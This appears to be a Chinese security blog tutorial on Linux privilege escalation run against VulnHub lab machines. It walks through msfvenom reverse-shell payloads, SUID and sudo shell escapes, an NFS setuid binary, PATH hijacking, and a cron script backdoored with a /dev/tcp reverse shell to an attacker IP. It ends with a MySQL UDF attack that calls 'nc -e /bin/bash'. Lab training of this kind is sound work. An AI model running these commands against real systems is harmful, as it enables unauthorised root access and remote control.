---
title: "Linux提权（一）"
date: 2024-06-26
description: ""
tags: ["提权"]
categories: ["${folder}"]
---

**前情提要**
--------

Linux：

getuid

系统用户：UID(0-999)

普通用户：UID(1000-\*)

root用户：UID为0，拥有系统的完全控制权限

```text-plain
┌──(root㉿kali)-[~]
└─# id      
用户id=0(root) 组id=0(root) 组=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),133(scanner),141(kaboxer)
 
```

**MSF Linux上线**
---------------

### **show options  (看需要配置什么)**

有初学的师傅上线Linux生成马子就干，不急先使用show options命令看有没有需要配置的东西

```text-plain
监听器的设置
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

  Name Current Setting Required Description
  ---- --------------- -------- -----------


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting Required Description
  ----   --------------- -------- -----------
  LHOST 填写自己攻击机的IP yes       The listen address (an interface may be specified)
  LPORT 8888             yes       The listen port


Exploit target:

  Id Name
  -- ----
  0   Wildcard Target
 
 
msf6 exploit(multi/handler) >set LHOST 填写自己攻击机的IP
```

### **哥斯拉PMeterpreter模块转MSF的坑**

哥斯拉和自己生成的马子不一样，注意设置payload

```text-plain
自己生成马子上线

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf > mshell.elf

监听器payload设置
msf6 exploit(multi/handler) >set payload linux/x64/meterpreter/reverse_tcp

哥斯拉转发上线
监听器payload
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp

###一个是马子上线，一个是shell上线不一样，建议还是直接哥斯拉上线，上传马子太敏感了


报错
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.11:8888
[*] Sending stage (3020772 bytes) to 192.168.1.5
[-] Meterpreter session 1 is not valid and will be closed
[*] - Meterpreter session 1 closed.

###这就是payload设置没对session断掉了
 
```

### **MSF经常使用技巧**

```text-plain
background     ###返回上一级，经常用到
show options   ###使用模块攻击前先配置好，别又报错了
exit   ###退出不建议用还是用上面的background好

sessions   ###查看当前连接的session如下
msf6 exploit(multi/handler) > sessions

search 漏洞名称     ###查找msf的漏洞脚本

Active sessions
===============

Id Name Type                   Information         Connection
-- ---- ----                   -----------         ----------
4         meterpreter php/linux www-data @ darkhole 192.168.1.11:8888 -> 192.168.1.5:51266 (192.168.1.5)


sessions -i 4   ###指定进入session
msf6 exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

 
```

### **MSF生成马子的坑**

问题根源：msf版本不同导致语法不同

```text-plain
msf5版本生成马子的命令
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf > mshell.elf


msf6版本生成马子的命令
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf > mshell.elf

###小坑一个我先给踩了
```

**内核溢出提权（比较主流的提权）**
-------------------

### **流程：**

信息收集系统内核等信息——>筛选适用的脚本——>提权

不建议使用msf自动的那个模块，不是很好用

1、信息收集

当前主机的操作系统

```text-plain
hostnamectl
cat /etc/*-release
lsb_release -a
cat /etc/lsb-release # Debain
cat /etc/redhat-release # Redhat
cat /etc/centos-release # Centos
cat /etc/os-release # Ubuntu
cat /etc/issue
```

实例

```text-plain
hostnamectl
```

```text-plain
hostnamectl   ###这个就够用别一个一个测
  Static hostname: darkhole
        Icon name: computer-vm
          Chassis: vm
      Machine ID: 0d436af297774adfa085d28ed92d4210
          Boot ID: 598921d4c2d646f4a89ee08cd97c986e
  Virtualization: vmware
Operating System: Ubuntu 20.04.2 LTS
          Kernel: Linux 5.4.0-182-generic
    Architecture: x86-64
 
```

当前主机的内核版本

```text-plain
hostnamectl
uname -a     ###用这一条差不多了
uname -r
cat /proc/version
dmesg | grep "Linux version"
```

实例

```text-plain
uname -a
```

```text-plain
uname -a
Linux darkhole 5.4.0-182-generic #202-Ubuntu SMP Fri Apr 26 12:29:36 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

2、内核漏洞筛选：

MSF检测：

```text-plain
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

  Name             Current Setting Required Description
  ----             --------------- -------- -----------
  SESSION                           yes       The session to run this module on
  SHOWDESCRIPTION false           yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 192.168.1.5 - Collecting local exploits for php/linux...
[-] 192.168.1.5 - No suggestions available.
[*] Post module execution completed


###公开版检测没有，实在是垃圾建议使用其他脚本工具，或者使用msfpro版本那个挺厉害的
```

提权脚本:

https://github.com/liamg/traitor

https://github.com/The-Z-Labs/linux-exploit-suggester

https://github.com/jondonas/linux-exploit-suggester-2

https://github.com/belane/linux-soft-exploit-suggester

综合脚本:

https://github.com/carlospolop/PEASS-ng

https://github.com/diego-treitos/linux-smart-enumeration

https://github.com/redcode-labs/Bashark

https://github.com/rebootuser/LinEnum

**提权脚本（都大差不差就写一个了）**
--------------------

### **linux-exploit-suggester项目**

#### **工具的介绍**

Linux\_Exploit\_Suggester是一款根据Linux操作系统版本号自动查找相应提权脚本的工具，旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。

项目地址：<https://github.com/mzet-/linux-exploit-suggester>

Highly probable：评估的内核很可能受到影响，并且 PoC 漏洞利用很有可能不用在任何重大修改的情况下开箱即用Probable：漏洞利用可能会起作用，但很可能需要定制 PoC 漏洞利用以适合目标使用Less probable：需要额外的手动分析来验证内核是否受到影响Unprobable：内核极不可能受到影响（漏洞利用不会显示在工具的输出中）

#### **工具的使用**

1 上传脚本然后直接运行     ###注意给脚本权限   chmod +x 1.sh

2 优先看有Tags字段的

```text-plain

[+] [CVE-2022-2586] nft_object UAF

  Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
  Exposure: probable
  Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
  Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
  Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

  Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
  Exposure: probable
  Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
  Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

  Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
  Exposure: probable
  Tags: mint=19,[ ubuntu=18|20 ], debian=10
  Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main


### 截取了部分响应，具体怎么操作建议自行实验
 
```

3 选择脚本直接提权

不一定使用他提供的脚本地址

例如  
Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main  
  
反正我没成功  
推荐一个脚本POC集成项目，根据漏洞编号找  
  
https://github.com/SecWiki/linux-kernel-exploits  
https://github.com/nomi-sec/PoC-in-GitHub/tree/master

**SUID提权（普通用户权限使用）**
--------------------

### **前情提要**

众所周知，在 Linux 中一切都是一个文件，而文件的权限有rwx（即读/写/执行），所有者、所有组、其它用户的rwx权限是彼此独立的。

文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限（chmod 754）。

其实在Linux的权限设置中还存在着除rwx，的第四类权限位，即；

SUID(Set UID)：

suid权限仅对二进制程序有效（binary program）；执行者对于该程序需要具有x的可执行权限；本权限仅在执行该程序的过程中有效（run-time）；执行者将具有该程序拥有者的权限。

SGID(Set SGID)：

SGID对二进制文件有用；程序执行者对该程序来说，具有x权限；执行者在执行的过程中将获得该程序群组的权限；

Sticky Bit

SBIT只针对目录有效；除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录；

### **使用PEASS-ng工具探测**

```text-plain
###在你执行了以后不光可以直接用脚本来进行sudo提权

执行以后会有这样一个模块Files with Interesting Permissions

例子（截取部分代码）
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                    
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid            
strace Not Found                                                                            
-rwsr-xr-x 1 root root 87K Dec 10 2012 /bin/mount ---> Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                                                            
-rwsr-xr-x 1 root root 31K Apr 13 2011 /bin/ping
-rwsr-xr-x 1 root root 35K Feb 27 2017 /bin/su
-rwsr-xr-x 1 root root 35K Apr 13 2011 /bin/ping6
-rwsr-xr-x 1 root root 67K Dec 10 2012 /bin/umount ---> BSD/Linux(08-1996)
-rwsr-sr-x 1 daemon daemon 50K Oct 4 2014 /usr/bin/at ---> RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 36K Feb 27 2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 45K Feb 27 2017 /usr/bin/passwd ---> Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                              
-rwsr-xr-x 1 root root 31K Feb 27 2017 /usr/bin/newgrp ---> HP-UX_10.20
-rwsr-xr-x 1 root root 44K Feb 27 2017 /usr/bin/chfn ---> SuSE_9.3/10
-rwsr-xr-x 1 root root 65K Feb 27 2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 82K Nov 18 2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 159K Jan 6 2012 /usr/bin/find


###
我们看什么呢？
###
就看标红的文件或者命令
sudo的原理简单来说，就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用
我用到的就是find命令来进行sudo提权
###
为什么用find？
###
因为find可以调用-exec来执行命令
####
使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用

1. find ./ acce -exec '/bin/sh' \;
2.
touch bcce
find bcce -exec '/bin/sh' \;
```

实际效果

```text-plain
/usr/bin/find . -exec 'whoami' \;                
root
root
root
root
root


###总的来说啊就是/bin/sh这个位置可以替换成命令
然后我们可以弹一个root权限的shell回来
也可以直接提权起一个root终端
#####
```

### **使用命令进行探测**

```text-plain
命令：SUID GUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null


find / -perm -g=s -type f 2>/dev/null
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/mlocate
/usr/bin/lockfile
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/mutt_dotlock
/usr/bin/wall
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/procmail
/usr/bin/dotlockfile
/usr/lib/utempter/utempter
/sbin/unix_chkpwd

还是建议用上面那个工具
简洁明了

#利用参考：
https://gtfobins.github.io/
 
```

**sudo提权（普通用户权限使用）**
--------------------

环境：https://www.vulnhub.com/entry/toppo-1,245/

搭建：创建任意虚拟机，然后将toppo.vmdx文件改名并替换原来的vmdx文件

### **前情提要**

sudo提权其实和suid提权原理差不多

我们安装工具的时候经常使用到sudo来执行脚本

当我们使用这个sudo命令的时候就有可能造成安全问题

总的来说就是其他用户调用一些命令的时候不会因为权限问题受限，root可以调用，web用户也可以调用

### **过程**

```text-plain
SUDO:

cat /etc/sudoers

/usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

这个提权就不过多阐述

#利用参考：https://gtfobins.github.io/

**总结SUDO&SUID**
---------------

#应用场景：

获取到Web权限或普通用户在Linux服务器上时进行的SUID&SUDO提权

SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux/Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。

SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：/etc/sudoers，除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287 CVE-2021-3156）。

注意这个漏洞比较重要CVE-2021-3156

```text-plain
###sudo在这个版本可能有漏洞
sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1

###可以使用sudo -V查看

┌──(root㉿kali)-[~]
└─# sudo -V                    
Sudo 版本 1.9.10
当前选项：--build=x86_64-linux-gnu --prefix=/usr --includedir=${prefix}/include --mandir=${prefix}/share/man --infodir=${prefix}/share/info --sysconfdir=/etc --localstatedir=/var --disable-option-checking --disable-silent-rules --libdir=${prefix}/lib/x86_64-linux-gnu --runstatedir=/run --disable-maintainer-mode --disable-dependency-tracking --with-all-insults --with-pam --with-pam-login --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p: --with-tty-tickets --without-lecture --disable-root-mailer --with-sendmail=/usr/sbin/sendmail --with-rundir=/run/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --enable-zlib=system --enable-admin-flag --with-selinux --with-linux-audit --enable-tmpfiles.d=/usr/lib/tmpfiles.d MVPROG=/bin/mv --with-exampledir=/usr/share/doc/sudo/examples
Sudoers 策略插件版本 1.9.10
Sudoers 文件语法版本 48
 
```

这个没什么卵用CVE-2019-14287

**利用NFS提权**
-----------

### **认识NFS**

什么是NFS？

网络文件系统（**NFS**）是一个客户端/服务器应用程序，它使计算机用户可以查看和选择存储和更新远程计算机上的文件，就像它们位于用户自己的计算机上一样。在  **NFS**  协议是几个分布式文件系统标准，网络附加存储（NAS）之一。

NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。

### **过程**

```text-plain
先扫靶机就不多说了
nmap 192.168.1.6

### NFS服务利用（连接NFS的命令）
showmount -e 192.168.1.6

###在本机kali创建共享的文件夹（小坑一个）
mkdir nfs

### 这是通过脚本来提权，你也可以上传带有suid的文件来提权




### 攻击机上执行

配合SUID提权
注意gcc编译机器与目标机内核版本相似
#include<stdlib.h>
#include<unistd.h>
int main()
{
setuid(0);
system("id");
system("/bin/bash");
}
gcc getroot.c -o getroot
cp getroot /root/nfs #复制bash到挂载目录下
chmod +s getroot   #赋予suid权限
chmod 777 getroot   #可读可写可执行权限

find / -perm -u=s -type f 2>/dev/null 再看看是否加入suid文件
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/mlocate
/usr/bin/lockfile
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/mutt_dotlock
/usr/bin/wall
/usr/bin/crontab
/mnt/nfs/getroot   ####有了嘿嘿嘿



###靶机上执行
cd /mnt/nfs     # 目标机
./getroot       # 目标机


 
```

### **总结**

NFS其实就相当于文件共享，在实战中遇到的很少  
然后我们上传什么文件，他就继承什么权限  
所以我们可以上传suid的find  
给他root权限，然后我们就可以执行这个文件从而得到管理员的shell  
  
  
###有一个小坑不同内核的Linux，不同版本的Linux上传上去的文件执行提权有可能会报错  
解决方案：  
1 找一个相似版本的文件  
2 编译一个c语言的脚本来调用（如过程当中所展示）

**Cron定时任务提权（不怎么好用）**
---------------------

### **靶机**

https://www.vulnhub.com/entry/jarbas-1,232/

### **前情提要**

定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.\*/ 目录。它同样也会检查 /var/spool/cron/ 目录。

提升条件：Web或用户权限进行查看，任务文件可修改

### **过程**

```text-plain
###如何判断可以用哪些任务？
一般来说是在/etc/crontab
所以我们直接
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# | .------------- hour (0 - 23)
# | | .---------- day of month (1 - 31)
# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...
# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# | | | | |
# * * * * * user-name command to be executed
17 *   * * *   root   cd / && run-parts --report /etc/cron.hourly
25 6   * * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6   * * 7   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6   1 * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#



###然后去修改这些定时任务加入反弹shell命令就可以直接提权了
注意要修改root用户启动的定时任务才能成功提权

实例
cat /etc/script/CleaningScript.sh   #查看脚本内容
ls -lia /etc/script/CleaningScript.sh #查看对任务文件的权限
echo "/bin/bash -i >& /dev/tcp/192.168.139.141/66 0>&1" >> /etc/script/CleaningScript.sh
```

**PATH变量提权**
------------

### **前情提要**

PATH变量提权本质上和suid提权差不多，当suid提权的命令无法执行命令的时候，我们就要考虑PATH提权了，有部分运维人员为了方便会自己写脚本，而这些脚本会调用一些命令，众所周知Linux一切都是文件，命令也是调用文件，所以我们现在可以上传一个相同的命令文件，通过修改系统变量，让系统调用命令的时候调用我们的文件，然后我们在我们的文件中插入反弹shell命令，从而达到提权的目的

注意还是和suid提权一样，注意原本文件的权限为root

### **过程**

```text-plain
###查找有权限的文件
find / -perm -u=s -type f 2>/dev/null
/usr/bin/ssh-agent
/usr/bin/at
/usr/bin/mlocate
/usr/bin/lockfile
/usr/bin/chage
/opt/statuscheck

###看文件调用了什么命令
strings /opt/statuscheck
假如调用了curl命令

###到/tmp上传我们的curl，替换系统变量然后执行原本的文件
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH   ###替换变量
echo $PATH       ###看看变量替换成功没
/opt/statuscheck     ####运行原本的脚本
 
```

**数据库类型提权**
-----------

### **前情提要**

其实之前写过一篇数据库提权了，这里再细说一下  
MSSQL MySQL Redis(linux特有) sqlserver（windows特有）

### **UDF提权过程**

```text-plain
###之前写过了今天就不写那么细了


kali上有利用脚本搜索一下
┌──(root㉿kali)-[~]
└─# searchsploit udf      
------------------------------------------------------------------------------------------ ---------------------------------
Exploit Title                                                                           | Path
------------------------------------------------------------------------------------------ ---------------------------------
Cloudflare WARP 1.4 - Unquoted Service Path                                               | windows/local/50805.txt
DUdForum 3.0 - 'iFor' SQL Injection                                                       | asp/webapps/5894.txt
FUDforum - Multiple Remote PHP Code Injection Vulnerabilities                             | php/webapps/38418.txt
FUDforum 3.0.6 - Cross-Site Scripting / Cross-Site Request Forgery                       | php/webapps/40802.txt
FUDforum 3.0.6 - Local File Inclusion                                                     | php/webapps/40803.txt
FUDForum 3.0.9 - Remote Code Execution                                                   | php/webapps/47650.txt
FUDForum 3.1.0 - 'author' Reflected XSS                                                   | php/webapps/49943.txt
FUDForum 3.1.0 - 'srch' Reflected XSS                                                     | php/webapps/49942.txt
Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Disclosure                             | php/webapps/21723.txt
Ilia Alshanetsky FUDForum 1.2.8/1.9.8/2.0.2 - File Modification                           | php/webapps/21724.txt
MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                   | linux/local/1181.c
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                   | linux/local/1518.c
MySQL 4/5/6 - UDF for Command Execution                                                   | linux/local/7856.txt
NCTsoft - 'AudFile.dll' ActiveX Control Remote Buffer Overflow                           | windows/remote/6175.html
PostgreSQL 8.2/8.3/8.4 - UDF for Command Execution                                       | linux/local/7855.txt
RedHat CloudForms Management Engine 5.1 - agent/linuxpkgs Directory Traversal (Metasploit | linux/remote/30469.rb
------------------------------------------------------------------------------------------ ---------------------------------




###找一下脚本位置
┌──(root㉿kali)-[~]
└─# find / -name 1518.c
/usr/share/exploitdb/exploits/linux/local/1518.c

###自己保存到桌面上编译一下（这不多说）
cp /usr/share/exploitdb/exploits/linux/local/1518.c /home/kali/桌面

gcc -g -shared -Wl,-soname,1518.so -o udf.so 1518.c -lc


###上传这个文件到靶机

-连接进行导出调用
mysql -uroot -pR@v3nSecurity
select version();   #查看mysql版本
select @@basedir;   #确认mysql安装位置
show variables like '%basedir%';   #确认mysql安装位置
show variables like '%secure%'; #查看可导出文件位置
show variables like '%plugin%';   #查找插件位置
show variables like '%compile%';   #查看系统版本
use mysql;

# 创建mkbk表
create table xiaodi(line blob);

# 往mkbk表中插入二进制的udf.so
insert into xiaodi values(load_file('/tmp/udf.so'));

# 导出udf.so
select * from xiaodi into dumpfile '/usr/lib/mysql/plugin/udf.so'•;

# 创建do_system自定义函数
create function do_system returns integer soname 'udf.so';
select do_system('nc 192.168.139.141 6666 -e /bin/bash');



能外联直接用工具，别自己搞太难受了
```

原文转自：[水刃安全](https://mp.weixin.qq.com/s/FpFqyAUUR8A882WWVWPCxg)
